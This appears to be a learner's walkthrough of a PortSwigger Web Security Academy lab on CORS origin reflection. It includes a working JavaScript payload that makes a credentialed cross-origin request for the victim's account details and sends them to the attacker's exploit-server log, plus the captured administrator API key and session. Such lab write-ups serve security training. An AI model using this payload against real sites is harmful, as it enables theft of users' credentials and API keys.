# Lab: CORS vulnerability with basic origin reflection
# https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-basic-origin-reflection-attack

```bash
# Open my account and check accountDetails request from burp's http history, It is a ajax request that retrives api key of the user.

# We see Access-Control-Allow-Credentials: true which is one of the CORS headers so we know that it's using CORS.
# Access-Control-Allow-Credentials: which allows credentials to be passed in the request either cookies or authorization headers or certificates which allows us private resources. For us we can access api key values.
# But in this case application makes use of session cookie so what we are passing is session cookie.
# We are targeting Admin's api key.
```
```bash
# Send the request to the repeater and add this origin.

Origin: http://random-website.com

# It is working so it means that application accepts any random origin to access it's data.
# If it didn't accept it then it means application accept's only certain domains to access it's data.Usually domain or subdomain of the website.

# Response:

Access-Control-Allow-Origin: http://random-website.com
```

```bash
# First we are going to use xml http request in order to extract data from the web server.
# Then we will initializa the url of the application, you can take it from host part of the request.
# Next make a get request.
# Next we want credentials that stored in that administrator's browser with the request.
# We are going to request that the browser send credentials with the application. We can do this because Access-Control-Allow-Credentials: true
# We are going to send request with 		xhr.send(null).
# Now we need to handle how we are going to extract the response of request.

<html>
	<body>
		<script>
		var xhr = new XMLHttpRequest();
		var url = "https://0a8300010436c31f81f92f7e00410006.web-security-academy.net"
		
		xhr.open('GET',url+"/accountDetails",true);
		xhr.withCredentials = true;
		xhr.send();
		
		function reqListener() {
			location='/log?key='+this.responseText;
		};
		xhr.onload= reqListener
		</script>

	</body>
</html>
```

```bash
# Deliver it to victim and then check the access log.

# Response:
"GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%229SI4r0SiFEqvjO53inNSVA4Qvp3Vy7PR%22,%20%20%22sessions%22:%20[%20%20%20%20%22YE8nUfzgMZ2wKpM1F8tYz9s3zOTXBZFX%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/ (Victim) AppleWebKit/ (KHTML, like Gecko) Chrome/ Safari/

# Copy the api key part which in this case 9SI4r0SiFEqvjO53inNSVA4Qvp3Vy7PR
# Submit solution.

```
